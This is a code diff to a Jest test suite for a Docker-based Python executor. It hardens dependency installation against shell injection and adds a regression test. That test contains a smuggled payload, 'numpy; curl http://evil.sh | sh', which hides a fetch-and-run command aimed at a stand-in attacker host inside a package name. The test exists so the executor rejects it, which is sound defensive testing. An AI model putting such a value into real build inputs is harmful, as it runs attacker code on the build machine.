@@ -295,7 +295,27 @@ describe('DockerPythonExecutor', () => {
         c => c[0] && c[0].endsWith('Dockerfile')
       );
       expect(dockerfileCall).toBeDefined();
-      expect(dockerfileCall[1]).toContain('pip install --no-cache-dir numpy pandas');
+      // 安全：不再把包名拼进 RUN（shell 注入面），改用 -r requirements.txt
+      expect(dockerfileCall[1]).toContain('pip install --no-cache-dir -r /tmp/requirements.txt');
+      const reqCall = fs.writeFileSync.mock.calls.find(
+        c => c[0] && c[0].endsWith('requirements.txt')
+      );
+      expect(reqCall).toBeDefined();
+      expect(reqCall[1]).toBe('numpy\npandas');
+    });
+
+    it('rejects requirements with shell injection characters (no RUN command injection)', async () => {
+      jest.spyOn(fs, 'writeFileSync').mockImplementation(() => {});
+      const result = await executor.executeWithDependencies({
+        skillName: 'dep-skill',
+        scriptPath: '/scripts/dep.py',
+        requirements: ['numpy; curl http://evil.sh | sh']
+      });
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Unsafe requirement');
+      // 校验在构建前拦截，Dockerfile 不会包含注入内容
+      const dockerfileCall = fs.writeFileSync.mock.calls.find((c) => c[0] && c[0].endsWith('Dockerfile'));
+      expect(dockerfileCall).toBeUndefined();
     });
 
     it('returns failure result on build error', async () => {
